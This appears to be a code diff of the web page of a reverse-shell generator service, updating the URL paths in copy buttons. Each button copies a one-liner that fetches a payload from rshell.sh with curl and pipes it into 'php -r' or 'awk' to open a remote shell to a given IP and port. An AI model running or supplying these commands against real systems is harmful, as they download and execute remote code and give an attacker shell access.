@@ -129,7 +129,7 @@
 		</button>
 		<script>
 		  function copyPHPXargs() {
-			var phpXargsStr =  "curl -s rshell.sh/php/127.0.0.1/12345/?quotes=single&lang=php | xargs php -r";
+			var phpXargsStr =  "curl -s rshell.sh/127.0.0.1/12345/?quotes=single&lang=php | xargs php -r";
 			navigator.clipboard.writeText(phpXargsStr);
 			alert("Text Copied!" 
 				+ "\n\n\t" + phpXargsStr);
@@ -151,11 +151,11 @@
 	  </td>
       <td>
 		<button onclick="copyAwkXargs()">
-		  <span title="Copy: curl -s rshell.sh/awk/127.0.0.1/12345/?quotes=single&lang=awk | xargs awk">✅</span>
+		  <span title="Copy: curl -s rshell.sh/127.0.0.1/12345/?quotes=single&lang=awk | xargs awk">✅</span>
 		</button>
 		<script>
 		  function copyAwkXargs() {
-			var awkXargsStr =  "curl -s rshell.sh/awk/127.0.0.1/12345/?quotes=single&lang=awk | xargs awk";
+			var awkXargsStr =  "curl -s rshell.sh/127.0.0.1/12345/?quotes=single&lang=awk | xargs awk";
 			navigator.clipboard.writeText(awkXargsStr);
 			alert("Text Copied!" 
 				+ "\n\n\t" + awkXargsStr);
